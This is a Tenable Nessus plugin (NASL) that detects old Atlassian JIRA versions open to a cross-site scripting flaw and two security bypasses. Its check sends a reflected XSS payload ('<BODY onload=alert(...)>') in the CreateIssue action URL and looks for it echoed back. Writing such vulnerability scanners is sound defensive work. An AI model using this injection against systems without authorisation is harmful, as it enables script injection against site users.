#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(29834);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-6617", "CVE-2007-6618", "CVE-2007-6619");
  script_bugtraq_id(27094, 27095);
  script_xref(name:"OSVDB", value:"42768");
  script_xref(name:"OSVDB", value:"42769");
  script_xref(name:"OSVDB", value:"42770");

  script_name(english:"Atlassian JIRA < 3.12.1 Multiple Vulnerabilities");
  script_summary(english:"Checks for an XSS issue involving 500page.jsp");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by one
or more vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"Atlassian JIRA, a web-based application for bug tracking, issue
tracking, and project management, installed on the remote web server
is affected by one or more of the following issues :

  - A cross-site scripting issue due to its failure to
    sanitize error messages under a user's control and
    passed to the '500page.jsp' script before using them
    to generate dynamic output.

  - A security bypass issue that may allow an attacker to
    change JIRA's default language by accessing its first
    Setup page directly.

  - A security bypass issue by which a user may delete a
    shared filter created by another user." );
 script_set_attribute(attribute:"see_also", value:"http://jira.atlassian.com/browse/JRA-13999" );
 script_set_attribute(attribute:"see_also", value:"http://jira.atlassian.com/browse/JRA-14086" );
 script_set_attribute(attribute:"see_also", value:"http://jira.atlassian.com/browse/JRA-14105" );
 script_set_attribute(attribute:"see_also", value:"http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2007-12-24" );
 script_set_attribute(attribute:"solution", value:
"Either apply the appropriate patch referenced in the bug report above
or upgrade to Atlassian JIRA version 3.12.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Try to exploit the XSS issue.
xss = string("<BODY onload=alert('", SCRIPT_NAME, "')>");
command = string(SCRIPT_NAME, "'", xss);

req = http_get(
  item:string("/secure/CreateIssue!", urlencode(str:command), ".jspa"),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if...
if (
  # it's Atlassian JIRA and ...
  "com.atlassian.jira." >< res && 
  # the output complains about our choice of command
  string("No command '", command, "' in action") >< res
)
{
 security_warning(port);
 set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
}
